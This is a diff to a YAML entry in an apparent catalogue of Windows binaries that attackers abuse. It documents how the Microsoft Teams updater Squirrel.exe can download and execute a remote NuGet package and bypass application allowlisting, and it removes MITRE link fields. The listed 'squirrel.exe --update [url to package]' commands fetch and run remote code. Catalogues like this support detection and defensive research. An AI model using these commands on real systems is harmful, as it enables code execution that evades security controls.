@@ -10,7 +10,6 @@ Commands:
     Category: Download
     Privileges: User
     MitreID: T1218
-    MitreLink: https://attack.mitre.org/techniques/T1218/
     OperatingSystem: Windows 7 and up with Microsoft Teams installed
   - Command: squirrel.exe --update [url to package]
     Description: The above binary will go to url and look for RELEASES file, download and install the nuget package.
@@ -18,7 +17,6 @@ Commands:
     Category: AWL Bypass
     Privileges: User
     MitreID: T1218
-    MitreLink: https://attack.mitre.org/techniques/T1218/
     OperatingSystem: Windows 7 and up with Microsoft Teams installed
   - Command: squirrel.exe --update [url to package]
     Description: The above binary will go to url and look for RELEASES file, download and install the nuget package.
@@ -26,7 +24,6 @@ Commands:
     Category: Execute
     Privileges: User
     MitreID: T1218
-    MitreLink: https://attack.mitre.org/techniques/T1218/
     OperatingSystem: Windows 7 and up with Microsoft Teams installed
   - Command: squirrel.exe --updateRoolback=[url to package]
     Description: The above binary will go to url and look for RELEASES file, download and install the nuget package.
@@ -34,7 +31,6 @@ Commands:
     Category: AWL Bypass
     Privileges: User
     MitreID: T1218
-    MitreLink: https://attack.mitre.org/techniques/T1218/
     OperatingSystem: Windows 7 and up with Microsoft Teams installed
   - Command: squirrel.exe --updateRollback=[url to package]
     Description: The above binary will go to url and look for RELEASES file, download and install the nuget package.
@@ -42,7 +38,6 @@ Commands:
     Category: Execute
     Privileges: User
     MitreID: T1218
-    MitreLink: https://attack.mitre.org/techniques/T1218/
     OperatingSystem: Windows 7 and up with Microsoft Teams installed
 Full_Path:
   - Path: '%localappdata%\Microsoft\Teams\current\Squirrel.exe'
